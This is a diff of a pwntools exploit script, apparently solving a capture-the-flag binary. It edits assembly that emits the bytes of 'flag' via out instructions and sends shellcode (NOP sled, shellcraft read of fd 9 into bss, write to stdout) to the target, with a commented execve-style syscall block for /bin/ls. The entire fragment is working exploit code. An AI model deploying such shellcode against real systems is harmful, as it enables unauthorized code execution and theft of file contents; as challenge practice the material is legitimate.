@@ -26,13 +26,13 @@ LIBC.srand(LIBC.time(0))
 
 ipt = asm('''
         mov al, {}
-        out (0x33), al
+        out (0xff), al
         mov al, {}
-        out (0x33), al
+        out (0xff), al
         mov al, {}
-        out (0x33), al
+        out (0xff), al
         mov al, {}
-        out (0x33), al
+        out (0xff), al
         '''.format(ord('f'), ord('l'), ord('a'), ord('g')),
         )
 io.sendlineafter(":", ipt)
@@ -88,14 +88,14 @@ sc += asm(shellcraft.read(9, elf.bss() + 0x500, 0x100))
 sc += asm(shellcraft.write(1, elf.bss() + 0x500, 0x100))
 sc = '\x90' * 20 + sc
 
-#  sc = asm('''
-        #  mov rax, {}
-        #  mov rdi, {}
-        #  mov rsi, {}
-        #  mov rdx, 0
-        #  syscall
-        #  '''.format(0x40000000 + 0x3b, base + 0x100, base + 0x108))
-#  sc = sc.ljust(0x100, "\0") + "/bin/ls\0" + p64(base + 0x100)
+# sc = asm('''
+#         mov rax, {}
+#         mov rdi, {}
+#         mov rsi, {}
+#         mov rdx, 0
+#         syscall
+#         '''.format(0x40000000 + 0x3b, base + 0x100, base + 0x108))
+# sc = sc.ljust(0x100, "\0") + "/bin/ls\0" + p64(base + 0x100)
 
 io.send(sc)
 
